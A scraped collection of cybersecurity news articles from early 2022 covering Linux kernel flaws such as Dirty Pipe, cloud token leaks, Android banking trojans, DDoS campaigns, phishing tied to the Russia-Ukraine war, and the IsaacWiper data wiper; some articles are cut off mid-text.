enabled by Dirty Pipe includes the ability to modify files in container images, provided a bad actor has access to a single container on the host.\n“If they have that access and the kernel version is vulnerable, they can modify any files from the image that was used to create the container that they have access to, or any files that are mounted read only from the underlying host,“ Aqua Security’s Rory McCune said in a report.\n\n“To make this vulnerability more interesting, it not only works without write permissions, it also works with immutable files, on read-only btrfs snapshots and on read-only mounts (including CD-ROM mounts),“ the researcher said. “That is because the page cache is always writable (by the kernel), and writing to a pipe never checks any permissions.“\nThe issue has been fixed in Linux versions 5.16.11, 5.15.25, and 5.10.102 as of February 23, 2022, three days after it was reported to the Linux kernel security team. Google, for its part, has merged the fixes into the Android kernel on February 24, 2022.\nGiven the ease with which the security flaw can be exploited and the release of the PoC exploit, it’s recommended that users update Linux servers immediately and apply the patches for other distros as soon as they are available.\n\n\nFound this article interesting?

It’s worth noting that this feature is enabled by default. Following responsible disclosure on December 6, 2021, the issue was remediated in a patch pushed on December 10, 2021.\n\n“Azure Automation accounts that used Managed Identities tokens for authorization and an Azure Sandbox for job runtime and execution were exposed,“ Microsoft Security Response Center (MSRC) said in a statement. “Microsoft has not detected evidence of misuse of tokens.“\nWhile the automation jobs are designed to be isolated by means of a sandbox to prevent access by other code running on the same virtual machine, the vulnerability made it possible for a bad actor executing a job in an Azure Sandbox to obtain the authentication tokens of other automation jobs.\n\n“Someone with malicious intentions could’ve continuously grabbed tokens, and with each token, widen the attack to more Azure customers,“ Tsarimi noted.\nThe disclosure comes nearly two months after Amazon Web Services (AWS) fixed two vulnerabilities – dubbed Superglue and BreakingFormation – in the AWS Glue and CloudFormation platforms that could have been abused to access data of other AWS Glue customers and leak sensitive files.\nIn December 2021, Microsoft also resolved another security weakness in the Azure App Service that resulted in the exposure of source code of customer applications written in Java, Node, PHP, Python, and Ruby for at least four years since September 2017.\n\n\nFound this article interesting?

Following responsible disclosure, the flaws were patched in TOS version 4.2.30 released last week on March 1, 2022.\n\nOne of the issues, tracked as CVE-2022-24990, concerns a case of information leak in a component called “webNasIPS,“ resulting in the exposure of TOS firmware version, the default gateway interface’s IP and MAC address, and a hash of the administrator password.\nThe second shortcoming, on the other hand, relates to a command injection flaw in a PHP module called “createRaid“ (CVE-2022-24989), resulting in a scenario where the two issues can be stringed together to submit a specially-crafted command to achieve remote code execution.\n“All in all, this was a very interesting project,“ Yibelo said. “We have used multiple components of an information leak, along with another information leak of the machine’s time, and chained it with an authenticated OS command injection to achieve unauthenticated remote code execution as root.\nThe disclosure arrives as TerraMaster NAS devices have also been subjected to Deadbolt ransomware attacks, joining the likes of QNAP and ASUSTOR, with the company noting that it addressed the vulnerabilities that were likely exploited by the threat actors to deploy the ransomware in TOS version 4.2.30.\n\nIt’s not immediately clear if the same set of vulnerabilities discovered by Octagon Networks were weaponized for Deadbolt infections. We have reached out to TerraMaster for further comment, and we will update the story if we hear back.\n“Fixed a security vulnerability related to the Deadbolt ransomware attack,“ the company noted, recommending users to “re-install the latest version of the TOS system (4.2.30 or later) to prevent unencrypted files from continuing to be encrypted.“\n\n\nFound this article interesting?

It first emerged on the scene in November 2021.\nWhere SharkBot stands apart is in its ability to carry out the unauthorized transactions via Automatic Transfer Systems (ATS), which stands in contrast to TeaBot, which requires a live operator to interact with the infected devices to conduct the malicious activities.\n\n“The ATS features allow the malware to receive a list of events to be simulated, and they will be simulated in order to do the money transfers,“ Alberto Segura and Rolf Govers, malware analysts at cybersecurity firm NCC Group, said in a report published last week.\n\n“Since these features can be used to simulate touches/clicks and button presses, it can be used to not only automatically transfer money but also install other malicious applications or components.“\nIn other words, ATS is employed to deceive the targeted bank’s fraud detection systems by simulating the same sequence of actions that would be performed by the user, such as button presses, clicks, and gestures, in order to make the illicit money transfer.\nThe latest version spotted on the Google Play Store on February 28 are a number of dropper apps that also leverages Android’s Direct Reply functionality to propagate itself to other devices, making it the second banking trojan after FluBot to intercept notifications for wormable attacks.\nThe list of malicious apps, all of which were updated on February 10, have been collectively installed about 57,000 times to date –\nAntivirus, Super Cleaner (com.abbondioendrizzi.antivirus.supercleaner) – 1,000+ installsAtom Clean-Booster, Antivirus (com.abbondioendrizzi.tools.supercleaner) – 500+ installsAlpha Antivirus, Cleaner (com.pagnotto28.sellsourcecode.alpha) – 5,000+ installs, andPowerful Cleaner, Antivirus (com.pagnotto28.sellsourcecode.supercleaner) – 50,000+ installs\n\nSharkBot is also feature-rich in that it enables the adversary to inject fraudulent overlays atop official banking apps to steal credentials, log keystrokes, and obtain full remote control over the devices, but only after the victims grant it Accessibility Services permissions.\nThe findings come a week after researchers from Cleafy disclosed details of a new TeaBot variant found in the Play Store that’s designed to target users of more than 400 banking and financial apps, including those from Russia, China, and the U.S.\n\n\nFound this article interesting?

If this file contains the value 0, then the release_agent program is not invoked. If it contains the value 1, the release_agent program is invoked. The default value for this file in the root cgroup is 0.\nSpecifically, the Palo Alto Networks threat intelligence team noted that the bug is a consequence of a missing verification to check whether the process setting the release_agent file had administrative privileges, thereby making it ripe for potential exploitation.\nIn other words, should this release_agent file be overwritten by an attacker, the kernel can be forced into calling an arbitrary binary configured in the release agent with the highest possible permissions – a scenario that could effectively allow a complete takeover of the machine.\nIt’s, however, worth noting that only processes with “root“ privileges can write to the file, meaning that the vulnerability solely permits root processes to escalate privileges.\n“At first glance, a privilege escalation vulnerability that can only be exploited by the root user may seem bizarre,“ Avrahami explained. “Running as root doesn’t necessarily mean full control over the machine: There’s a gray area between the root user and full privileges that includes capabilities, namespaces, and containers. In these scenarios where a root process doesn’t have full control over the machine, CVE-2022-0492 becomes a serious vulnerability.“\n\nAlthough containers running with AppArmor or SELinux are protected from the flaw, users are recommended to apply the patches in light of the fact that it could be abused by other malicious host processes to elevate privileges.\nThis is far from the first time release_agent has resurfaced as an attack vector. In July 2019, Google Project Zero researcher Felix Wilhelm demonstrated a “quick and dirty“ proof-of-concept (PoC) exploit leveraging the feature to break out of privileged Kubernetes and Docker containers.\nThen in November 2021, cloud native security firm Aqua disclosed details of a cryptocurrency mining campaign that used the exact same container escape technique to drop the XMRig coin miner on infected hosts, making it the first recorded instance of real-world exploitation.\n“CVE-2022-0492 marks another Linux vulnerability that can be exploited for container escape,“ Avrahami concluded. “Fortunately, environments that follow best practices are protected from this vulnerability. Environments with lax security controls hosting untrusted or publicly exposed containers are, unsurprisingly, at high risk.“\n\n\nFound this article interesting?

{'title': 'Imperva Thwarts 2.5 Million RPS Ransom DDoS Extortion Attacks',
'text': 'Cybersecurity company Imperva on Friday said it recently mitigated a ransom distributed denial-of-service (DDoS) attack targeting an unnamed website that peaked at 2.5 million requests per second (RPS).\n“While ransom DDoS attacks are not new, they appear to be evolving and becoming more interesting with time and with each new phase,“ Nelli Klepfish, security analyst at Imperva, said. “For example, we’ve seen instances where the ransom note is included in the attack itself embedded into a URL request.“\nThe top sources of the attacks came from Indonesia, followed by the U.S., China, Brazil, India, Colombia, Russia, Thailand, Mexico, and Argentina.\nDistributed denial-of-service (DDoS) attacks are a subcategory of denial-of-service (DoS) attacks in which an army of connected online devices, known as a botnet, is used to overwhelm a target website with fake traffic in an attempt to render it unavailable to legitimate users.\n\nThe California-headquartered firm said that the affected entity received multiple ransom notes included as part of the DDoS attacks, demanding the company make a bitcoin payment to stay online and avoid losing “hundreds of millions in market cap.“\nIn an interesting twist, the attackers are calling themselves REvil, the infamous ransomware-as-a-service cartel that suffered a major setback after a number of its operators were arrested by Russian law enforcement authorities earlier this January.\n“It is not clear however whether the threats were really made by the original REvil group or by an imposter,“ Klepfish noted.\nAttack origins\nThe 2.5 million RPS attack is said to have lasted less than a minute, with one of the sister sites operated by the same company sustaining a similar attack that lasted approximately 10 minutes, even as the tactics employed were constantly changed to avert possible mitigation.\nEvidence gathered by Imperva points to the DDoS attacks originating from the Mēris botnet, which has continued to leverage a now-addressed security vulnerability in Mikrotik routers (CVE-2018-14847) to strike targets, including Yandex last September.\n“The types of sites the threat actors are after appear to be business sites focusing on sales and communications,“ Klepfish said. “Targets tend to be U.S.- or Europe-based with the one thing they all have in common being that they are all exchange-listed companies and the threat actors use this to their advantage by referring to the potential damage a DDoS attack could do to the company stock price.“\n\nThe findings come as malicious actors have been spotted weaponizing a new amplification technique called TCP Middlebox Reflection for the very first time in the wild to hit banking, travel, gaming, media, and web hosting industries with a flood of fake traffic.\nThe ransom DDoS attack is also the second botnet-related activity averted by Imperva since the start of the year, what with the company detailing a web scraping attack that targeted an unidentified job listing platform in late January.\n“The attacker used a large-scale botnet, generating no less than 400 million bot requests from nearly 400,000 unique IP addresses over four days with the intent of harvesting job seekers’ profiles,“ the security firm said.\n\n\nFound this article interesting?

'text': 'The U.S. Cybersecurity and Infrastructure Security Agency (CISA) this week added 95 more security flaws to its Known Exploited Vulnerabilities Catalog, taking the total number of actively exploited vulnerabilities to 478.\n“These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risk to the federal enterprise,“ the agency said in an advisory published on March 3, 2022.\n\nOf the 95 newly added bugs, 38 relate to Cisco vulnerabilities, 27 for Microsoft, 16 for Adobe, seven impact Oracle, and one each corresponding to Apache Tomcat, ChakraCore, Exim, Mozilla Firefox, Linux Kernel, Siemens SIMATIC CP, and Treck TCP/IP stack.\nIncluded in the list are five issues discovered in Cisco RV routers, which CISA notes are being exploited in real-world attacks. The flaws, which came to light early last month, allow for the execution of arbitrary code with root privileges.\nThree of the vulnerabilities – CVE-2022-20699, CVE-2022-20700, and CVE-2022-20708 – are rated 10 out 10 on the CVSS rating scale, enabling an attacker to inject malicious commands, elevate privileges to root, and run arbitrary code on vulnerable systems.\nCVE-2022-20701 (CVSS score: 9.0) and CVE-2022-20703 (CVSS score: 9.3) are no different in that they could allow an adversary to “execute arbitrary code elevate privileges, execute arbitrary commands, bypass authentication and authorization protections, fetch and run unsigned software, or cause a denial of service,“ CISA added.\n\nCisco, for its part, previously acknowledged that it’s “aware that proof-of-concept exploit code is available for several of the vulnerabilities.“ Additional nature of the attacks or the threat actors that may be weaponizing them is unknown as yet.\nTo reduce the significant risk of the vulnerabilities and prevent them from being used as a vector for potential cyber-attacks, federal agencies in the U.S. are mandated to apply the patches by March 17, 2022.\nThe development comes shortly after Cisco released patches for critical security vulnerabilities affecting Expressway Series and Cisco TelePresence Video Communication Server (VCS) earlier in the week that could be exploited by a malicious party to gain elevated privileges and execute arbitrary code.\n\n\nFound this article interesting?

'text': 'Cyber criminals and hacktivist groups are increasingly using the Telegram messaging app to coordinate their activities, leak data, and spread disinformation, as the Russia-Ukraine conflict enters its eighth day.\nA new analysis by Israeli cybersecurity company Check Point Research has found that “user volume grew a hundred folds daily on Telegram related groups, peaking at 200,000 per group.“\nProminent among the groups are anti-Russian cyber attack groups, including the Ukraine government-backed IT Army, which has urged its more 270,000 members to conduct distributed denial-of-service (DDoS) attacks against Russian entities.\nOther hacktivist-oriented Telegram groups used to coordinate the attacks on Russian targets via DDoS, SMS or call-based attacks are Anna_ and Mark_, Check Point researchers noted.\n\nThat said, there may be more to these attacks than meets the eye. “It seems that many of the hacktivist groups are more focused on building self-reputation and receiving credit for supporting Ukraine or Russia, than to cause real damage to the countries,“ the researchers said.\nFurthermore, cyber criminals are looking to capitalize on the conflict through Telegram groups containing tens of thousands of users that aim to “raise funds for Ukraine“ and broadcast unverified news reports in an attempt to circumvent mainstream media.\nTelegram, for its part, said it may potentially consider partially or fully restricting certain channels so as to prevent malicious actors from abusing the platform to “deepen conflicts.“\nThe messaging app, which has over 500 million active users, has been used for black market activities in the past. In September 2021, more than 10,000 vendors were uncovered selling counterfeit COVID-19 vaccine certificates pertaining to over 25 countries for anywhere between $85 and $200, with some Telegram groups peaking at a follower size as large as 300,000.\n\nThe spike in the use of Telegram in Ukraine hasn’t escaped the notice of Moxie Marlinspike, the founder of privacy-oriented messaging Signal, who called the former’s “decade of misleading marketing“ for making most people in the country believe “it’s an encrypted app.“\n“The reality is the opposite – Telegram is by default a cloud database with a plaintext copy of every message everyone has ever sent/received,“ Marlinspike tweeted last week. “Every message, photo, video, document sent/received for the past 10 years; all contacts, group memberships, etc are all available to anyone with access to that database.“\n\n\nFound this article interesting?

'text': 'As the ongoing Russia-Ukraine conflict continues to escalate, the Russian government on Thursday released a massive list containing 17,576 IP addresses and 166 domains that it said are behind a series of distributed denial-of-service (DDoS) attacks aimed at its domestic infrastructure.\nSome of the noticeable domains in the listing released by Russia’s National Coordination Center for Computer Incidents (NCCCI) included the U.S. Federal Bureau of Investigation (FBI), Central Intelligence Agency (CIA), and websites of several media publications such as the USA Today, 24News.ge, megatv.ge, and Ukraine’s Korrespondent magazine.\nAs part of its recommendations to counter the DDoS attacks, the agency is urging organizations to ringfence network devices, enable logging, change passwords associated with key infrastructure elements, turn off automatic software updates, disable third-party plugins on websites, enforce data backups, and watch out for phishing attacks.\n\n“Use Russian DNS servers. Use the corporate DNS servers and/or the DNS servers of your telecom operator in order to prevent the organization’s users from being redirected to malicious resources or other malicious activity,“ the NCCCI added.\n“If your organization’s DNS zone [is] serviced by a foreign telecom operator, transfer it to the information space of the Russian Federation.“\nThe development comes as the ground war has been complemented by a barrage of cyber attacks in the digital domain, with hacktivist groups and other vigilante actors backing the two countries to strike websites of government and commercial entities and leak troves of personal data.\nAccording to global internet access watchdog NetBlocks, Russia is said to have placed extensive restrictions on Facebook access within the country, even as widespread internet outages have been reported in different parts of Ukraine such as Mariupol and Sumy.\nThat’s not all. Ukraine, which managed to amass a volunteer “IT Army“ of civilian hackers from around the world, put out a new set of targets that includes the Belarusian railway network, Russia’s homegrown satellite-based global navigation system GLONASS, and telecom operators like MTS and Beeline.\n\n“Friends, you have already done the incredible! But now we need to mobilize and intensify our efforts as much as possible,“ a post on the IT army Telegram channel read.\nMeanwhile, the Conti ransomware group, which got a taste of its own medicine when its attack methods were publicly leaked last week after declaring allegiance to Russia, has since announced that “we are up and running, our infra is intact and we are going full throttle,“ according to a message titled “Not Yet Kameraden!“ on its dark web portal.\nIn a related development, the U.S. Treasury Department said it’s sanctioning a number of Russian oligarchs and entities for providing direct and indirect support to the government and carrying out global influence operations “focused on sowing discord on social issues in Ukraine.“\n“Lone-wolf and organized threats actors who possess the proper cyber skills may directly attack their nation’s enemy or recruit others to join in a coordinated attack,“ Trustwave SpiderLabs researchers said. “These activities, coupled with specific malware use designed to ’prep’ the physical battlefield, could become a more widely used tactic to weaken a nation’s defensive capabilities, critical infrastructure or communication streams.“\n\n\nFound this article interesting?

'text': 'A group of academics from the North Carolina State University and Dokuz Eylul University have demonstrated what they say is the “first side-channel attack“ on homomorphic encryption that could be exploited to leak data as the encryption process is underway.\n“Basically, by monitoring power consumption in a device that is encoding data for homomorphic encryption, we are able to read the data as it is being encrypted,“ Aydin Aysu, one of the authors of the study, said. “This demonstrates that even next generation encryption technologies need protection against side-channel attacks.“\nHomomorphic Encryption is a form of encryption that allows certain types of computation to be performed directly on encrypted data without having to decrypt it in the first place.\n\nIt’s also meant to be privacy-preserving in that it allows sharing of sensitive data with other third-party services, such as data analytics firms, for further processing while the underlying information remains encrypted, and by extension, inaccessible to the service provider.\nPut differently, the goal of homomorphic encryption is to facilitate the development of end-to-end encrypted data storage and computation services where the data owner never needs to share their secret keys with third-party services.\nThe data leakage attack proposed by the researchers involves a vulnerability discovered in Microsoft SEAL, the tech giant’s open-source implementation of the technology, which could be exploited in a manner that allows the recovery of a piece of plaintext message that’s being homomorphically encrypted, effectively undoing the privacy protections.\n\nSpecifically, the attack, dubbed RevEAL, “targets the Gaussian sampling in the SEAL’s encryption phase and can extract the entire message with a single power measurement,“ by taking advantage of a “power-based side-channel leakage of Microsoft SEAL prior to v3.6 that implements the Brakerski/Fan-Vercauteren (BFV) protocol,“ the researchers said.\n\nThe researchers noted that SEAL versions 3.6, released on December 3, 2020, and later use a different sampling algorithm, while cautioning that newer versions of the library may suffer from a “different vulnerability.“\n“Encryption error is sampled from a Centered Binomial Distribution (CBD) by default unless ’SEAL_USE_GAUSSIAN_NOISE’ is set to ON,“ Kim Laine, Microsoft’s principal research manager who heads the Cryptography and Privacy Research Group, said in the release notes.\n“Sampling from a CBD is constant-time and faster than sampling from a Gaussian distribution, which is why it is used by many of the NIST PQC finalists,“ Laine further added.\n\n\nFound this article interesting?

{'title': 'How to Automate Offboarding to Keep Your Company Safe',
'text': 'In the midst of ’The Great Resignation,’ the damage from employees (or contractors) leaving an organization might be one of the greatest risks facing IT teams today. The reality is that in the busy enterprise computing environment, user onboarding and offboarding is a fact of daily life. \nWhen employee counts range into the five-figure territory — and entire networks of contractors have to be accounted for as well — it’s easy to lose track of who’s, literally, coming and going. Oftentimes, there are “offboarding“ steps that are forgotten about — disabling or removing the user from Active Directory or IAM is not sufficient as the user may have local credentials on some of the SaaS platforms or other sensitive systems. \nTechnically speaking, there are ways to automate offboarding using protocols such as SCIM and JIT mapping; however, it requires a high level of maturity in an IT environment and the staff to implement it.\nFor organizations not implementing SCIM or JIT, offboarded employees may still have local credentials on some of their regularly used SaaS platforms or other sensitive systems. Leaving these users’ access in place exposes organizations to unauthorized data access.\n\nWhen it comes to taking old users off systems - deprovisioning - there are a few best practices that should be borne in mind and followed.\nBest Practices in Deprovisioning\nKeep an Inventory — It’s essential that IT teams keep an up-to-date record, at all times, of all users with access to company systems. A channel of communication with human resources should be established for keeping abreast of events impacting the user inventory such as employee terminations. To be effective from a security standpoint, these systems need to be capable of scrutinizing both internal and external users. The vendor landscape can be constantly shifting.\nAlways be on the lookout — In addition to keeping track of intended system users, IT teams need to have a capability for user discovery that accounts for the full breadth of systems they may be accessing - both those in legacy environments, like on-premises systems, and in the mushrooming cloud environment. \nRigorous access control — It’s imperative that IT teams develop onboarding and offboarding protocols that account for the full extent of privileged employee computing access. If an employee has access to 3 internal systems and 30 cloud-hosted ones, then clearly limiting access to those on-premises will leave a gaping information hole that they will retain access to. \nHow to Automate the Deprovisioning Process\nThe meticulous mapping and security work that this process demands from a security team is vast. A SaaS Security Posture Management solution, like Adaptive Shield, can streamline this process — a simple query in Adaptive Shield’s user inventory can reveal the user posture of the deprovisioned users’ accounts across the entire SaaS stack.\nWhen it comes to deprovisioning these accounts, orchestration tools give security teams an easy way to integrate Adaptive Shield’s capabilities into an automated deprovisioning workflow. This vastly simplifies the process, reducing the amount of time it takes to fully deprovision users, and ensuring that no accounts are left active. \nScreenshot provided by Torq\nIn the figure above, you can can see a potential workflow where:\nThe initial IAM deprovisioning can be used as the hook to notify Adaptive Shield that a deprovisioning event has occurred.Adaptive Shield can probe the organization’s integrated SaaS landscape for records for that user, When Adaptive Shield detects an active account, it triggers a workflow in the automation tool that identifies the account, and deactivates it. If the account cannot be directly deactivated, it sends a message via Slack to an administrator, asking them to confirm the deactivation.',

{'title': 'Hackers Try to Target European Officials to Get Info on Ukrainian Refugees, Supplies',
'text': 'Details of a new nation-state sponsored phishing campaign have been uncovered setting its sights on European governmental entities in what’s seen as an attempt to obtain intelligence on refugee and supply movement in the region.\nEnterprise security company Proofpoint, which detected the malicious emails for the first time on February 24, 2022, dubbed the social engineering attacks “Asylum Ambuscade.“\n“The email included a malicious macro attachment which utilized social engineering themes pertaining to the Emergency Meeting of the NATO Security Council held on February 23, 2022,“ researchers Michael Raggi and Zydeca Cass said in a report published Tuesday.\n“The email also contained a malicious attachment which attempted to download malicious Lua malware named SunSeed and targeted European government personnel tasked with managing transportation and population movement in Europe.“\n\nThe findings build on an advisory issued by the State Service of Special Communication and Information Protection of Ukraine (DSSZZI), which warned last week of phishing messages targeting its military personnel with ZIP file attachments with the goal of stealing sensitive personal information.\nProofpoint declined to attribute the newly observed campaign to a specific threat actor, but noted that the overlaps in the timeline of the two sets of attacks, the phishing lures used, and the victimology patterns aligns with that of a Belarusian nation-state group called UNC1151 (aka TA445 or Ghostwriter).\n\nOne of the notable aspects of Asylum Ambuscade is the likely use of a compromised Ukrainian armed service member’s email account to broadcast malware-laced email messages containing a macro-enabled XLS file that delivers SunSeed onto infected hosts, implying that the latest campaign may be a continuation of these attacks.\n“The social engineering lures utilized in this phishing campaign were very timely, following a NATO Security Council meeting on February 23, 2022 and a news story about a Russian government ’kill list’ targeting Ukrainians that began circulating in Western media outlets on February 21, 2022,“ the researchers noted.\nSunSeed, for its part, functions as a downloader that establishes communications with an actor-controlled server to retrieve next-stage payloads for execution.\nThe Sunnyvale-based cybersecurity company noted that the attacks specifically singled out individuals who were tasked with responsibilities related to transportation, financial and budget allocation, administration, and population movement within Europe.\n\nThe disclosure comes as Russia’s intensifying military invasion of Ukraine has polarized cyberspace, with hacktivists, cybercriminals, white hat researchers, and technology companies picking a side in the conflict.\nIn a separate update posted earlier today, Ukraine’s Computer Emergency Response Team (CERT-UA) described the ongoing developments as an “information and psychological war,“ urging people in the country to carefully monitor their accounts for unrecognized devices, turn on two-factor authentication, and use end-to-end encrypted messaging apps.\nWhat’s more, email security company Avanan said it witnessed an eightfold increase in email-borne attacks originating from Russia starting on February 27, at least some of them targeting manufacturing, international shipping, and transportation companies located in the U.S. and Europe.\n“In light of the ongoing Russia-Ukraine war, actions by proxy actors like TA445 will continue to target European governments to gather intelligence around the movement of refugees from Ukraine and on issues of importance to the Russian government,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'Hackers Begin Weaponizing TCP Middlebox Reflection for Amplified DDoS Attacks',
'text': 'Distributed denial-of-service (DDoS) attacks leveraging a new amplification technique called TCP Middlebox Reflection have been detected for the first time in the wild, six months after the novel attack mechanism was presented in theory.\n“The attack […] abuses vulnerable firewalls and content filtering systems to reflect and amplify TCP traffic to a victim machine, creating a powerful DDoS attack,“ Akamai researchers said in a report published Tuesday.\n“This type of attack dangerously lowers the bar for DDoS attacks, as the attacker needs as little as 1/75th (in some cases) the amount of bandwidth from a volumetric standpoint,“ the researchers added.\n\nA distributed reflective denial-of-service (DRDoS) is a form of distributed denial-of-service (DDoS) attack that relies on publicly accessible UDP servers and bandwidth amplification factors (BAFs) to overwhelm a victim’s system with a high volume of UDP responses.\nIn these attacks, the adversary sends a flood of DNS or NTP requests containing a forged source IP address to the targeted asset, causing the destination server to deliver the responses back to the host residing at the spoofed address in an amplified manner that exhausts the bandwidth issued to the target.\n\nThe development comes following an academic study published in August 2021 about a new attack vector that exploits weaknesses in the implementation of TCP protocol in middleboxes and censorship infrastructure to carry out reflected denial of service (DoS) amplification attacks against targets.\nWhile DoS amplification attacks have traditionally abused UDP reflection vectors – owing to the connectionless nature of the protocol – the unconventional attack approach takes advantage of TCP non-compliance in middleboxes such as deep packet inspection (DPI) tools to stage TCP-based reflective amplification attacks.\nThe first wave of “noticeable“ attack campaigns taking advantage of the method is said to have occurred around February 17, striking Akamai customers across banking, travel, gaming, media, and web hosting industries with high amounts of traffic that peaked at 11 Gbps at 1.5 million packets per second (Mpps).\n“The vector has been seen used alone and as part of multi-vector campaigns, with the sizes of the attacks slowly climbing,“ Chad Seaman, lead of the security intelligence research team (SIRT) at Akamai, told The Hacker News.\n\nThe core idea with TCP-based reflection is to leverage the middleboxes that are used to enforce censorship laws and enterprise content filtering policies by sending specially crafted TCP packets to trigger a volumetric response.\nIndeed, in one of the attacks observed by the cloud security company, a single SYN packet with a 33-byte payload triggered a 2,156-byte response, effectively achieving an amplification factor of 65x (6,533%).\n“The main takeaway is that the new vector is starting to see real world abuse in the wild,“ Seaman said. “Typically, this is a signal that more widespread abuse of a particular vector is likely to follow as knowledge and popularity grows across the DDoS landscape and more attackers begin to create tooling to leverage the new vector.“\n“Defenders need to be aware that we’ve moved from theory to practice, and they should review their defensive strategies in accordance with this new vector, which they may be seeing in the real world soon,“ Seaman added.\n\n\nFound this article interesting?

{'title': 'LIVE Webinar: Key Lessons Learned from Major Cyberattacks in 2021 and What to Expect in 2022',
'text': 'With the COVID-19 pandemic continuing to impact, and perhaps permanently changing, how we work, cybercriminals again leveraged the distraction in new waves of cyberattacks. \nOver the course of 2021 we saw an increase in multiple attack approaches; some old, some new. Phishing and ransomware continued to grow from previous years, as expected, while new attacks on supply chains and cryptocurrencies captured our attention. We also saw an uptick in critical Windows vulnerabilities, again proving that no matter how many vulnerabilities are found, more will always exist. \nAs we enter 2022, we are seeing novel attacks originating from the conflict in Ukraine, which will certainly make their way into criminal attacks on worldwide businesses. In an upcoming webinar (register here), Cybersecurity company Cynet will provide an in-depth review of the high-profile attacks we saw in 2021 and provide guidance to cybersecurity professionals for 2022.\nWhat are the top cyberattacks in 2021 that Cynet will explore?\nThe Top 2021 Cyber Attacks\nFollowing are the top attack approaches that impacted companies around the world in 2021. \nPhishing\nWith over 90% of all attacks beginning with a simple phishing email, cyber criminals again set their sites on creating more sophisticated techniques and exploring novel social engineering approaches. During 2021 we mainly saw phishing campaigns using Emotet, Dridex, TrickBot, BazarLoader and a few others. Interesting that Emotet, with a major global takedown in 2020, resurfaced in 2021 as perhaps the most dangerous malware used in phishing campaigns.\nRansomware\nDuring 2021 we saw some major ransomware campaigns affecting large, global entities, including Colonial Pipeline, insurance giant AXA and computer giant Acer. Although we haven’t seen ransomware attacks change drastically, they remain the most lucrative e-crime business model. Some of the most prevalent ransomware variants used during 2021 include Conti, DarkSide, LockBit, and Revil. \nWindows Vulnerabilities\nSecurity professionals know that Windows vulnerabilities are, have been, and will continue to be a problem for every company that uses this OS. However, 2021 saw a concentration of critical vulnerabilities that impacted many Windows components, including Exchange server, kernel, print spooler, MSHTML, access control lists (ACL), and others. Will this continue into 2022?\nCrypto Currencies\nWith the price of Bitcoin reaching $68,000 during 2021, cybercriminals naturally saw an opportunity too good to ignore. Cryptocurrency attacks mostly focused on cryptojacking, compromising systems to mine currencies without the knowledge or permission of the infected host. A successful cryptojacking attack on only 100 endpoints can cost the victim $25,000 annually in electricity alone. Cynet will share an overview of several cryptojacking attacks that took place during 2021.\nSupply Chain Attacks\nAttacks on software supply chains increased by a whopping 650% during 2021 as threat actors wreaked havoc by infiltrating open-source software. Cybercriminals are setting their sites on open-source software, as exhibited by an exponential increase of vulnerabilities exposed year over year. With over 90% of organizations relying on open-source software, significant security and legal risk is introduced. \nWhat To Expect in 2022\nCynet will provide their unique perspective on the attacks that will likely unfold over the coming year. The increase in the approaches listed above shows no signs of abating. Cynet expects the Russian attack on Ukraine to unleash a new set of attack campaign tools that will make their way into the wild and will certainly be harnessed by cybercriminals globally. Cynet will provide insights and recommendations to help companies face the range of attacks expected over the next year.\nRegister to the webinar here.\n\n\nFound this article interesting?

'text': 'An Android banking trojan designed to steal credentials and SMS messages has been observed once again sneaking past Google Play Store protections to target users of more than 400 banking and financial apps, including those from Russia, China, and the U.S.\n“TeaBot RAT capabilities are achieved via the device screen’s live streaming (requested on-demand) plus the abuse of Accessibility Services for remote interaction and key-logging,“ Cleafy researchers said in a report. “This enables Threat Actors (TAs) to perform ATO (Account Takeover) directly from the compromised phone, also known as ’On-device fraud.’“\n\nAlso known by the names Anatsa and Toddler, TeaBot first emerged in May 2021, camouflaging its malicious functions by posing as seemingly innocuous PDF document and QR code scanner apps that are distributed via the official Google Play Store instead of third-party apps stores or via fraudulent websites.\nFurther research published by Swiss cyber threat intelligence company PRODAFT in July 2021 established that the banking malware had already “infected more than 7,632 devices and stolen over 1023 banking credentials,“ with the compromised users belonging to 18 financial institutions.\n\nThese apps, also known as dropper applications, act as a conduit to deliver a second-stage payload that retrieves the malware strain to take control of the infected devices. In November 2021, Dutch security firm ThreatFabric disclosed that it had identified six Anatsa droppers on the Play Store since June last year.\nThen earlier this January, Bitdefender researchers identified TeaBot lurking in the official Android app marketplace as a “QR Code Reader - Scanner App,“ gaining more than 100,000 downloads within a span of a month before it was taken down.\n\nThe latest version of TeaBot dropper spotted by Cleafy on February 21, 2022, is also a QR code reader app named “QR Code & Barcode - Scanner“ which has been downloaded roughly 10,000 times from the Play Store.\nOnce installed, the modus operandi is the same: prompt users to accept a fake add-on update, which, in turn, leads to the installation of a second app hosted on GitHub that actually contains the TeaBot malware. It’s, however, worth noting that users need to allow installs from unknown sources for this attack chain to be successful.\n\nThe last phase of the infection involves the banking trojan seeking Accessibility Services permissions to capture sensitive information like login credentials and two-factor authentication codes with the goal of taking over the accounts to carry out on-device fraud.\n“In less than a year, the number of applications targeted by TeaBot have grown more than 500%, going from 60 targets to over 400,“ the researchers said, adding the malware now strikes several apps related to personal banking, insurance, crypto wallets, and crypto exchanges.\n\n\nFound this article interesting?

{'title': 'Second New ’IsaacWiper’ Data Wiper Targets Ukraine After Russian Invasion',
'text': 'A new data wiper malware has been observed deployed against an unnamed Ukrainian government network, a day after destructive cyber attacks struck multiple entities in the country preceding the start of Russia’s military invasion.\nSlovak cybersecurity firm ESET dubbed the new malware “IsaacWiper,“ which it said was detected on February 24 in an organization that was not affected by HermeticWiper (aka FoxBlade), another data wiping malware that targeted several organizations on February 23 as part of a sabotage operation aimed at rendering the machines unusable.\nFurther analysis of the HermeticWiper attacks, which infected at least five Ukrainian organizations, have revealed a worm constituent that propagates the malware across the compromised network and a ransomware module that acts as a “distraction from the wiper attacks,“ corroborating a prior report from Symantec.\n\n“These destructive attacks leveraged at least three components: HermeticWiper for wiping the data, HermeticWizard for spreading on the local network, and HermeticRansom acting as a decoy ransomware,“ the company said.\nIn a separate analysis of the new Golang-based ransomware, Russian cybersecurity company Kaspersky, which codenamed the malware “Elections GoRansom,“ characterized it as a last-minute operation, adding it was “likely used as a smokescreen for the HermeticWiper attack due to its non-sophisticated style and poor implementation.“ \nAs an anti-forensic measure, HermeticWiper is also designed to hinder analysis by erasing itself from the disk by overwriting its own file with random bytes.\n\nESET said it hasn’t been able to find “any tangible connection“ to attribute these attacks to a known threat actor. But the malware artifacts unearthed so far make it clear that the intrusions had been planned for several months, with the targeted entities suffering compromises well in advance of the wiper’s deployment.\n“This is based on several facts: the HermeticWiper PE compilation timestamps, the oldest being December 28, 2021; the code-signing certificate issue date of April 13, 2021; 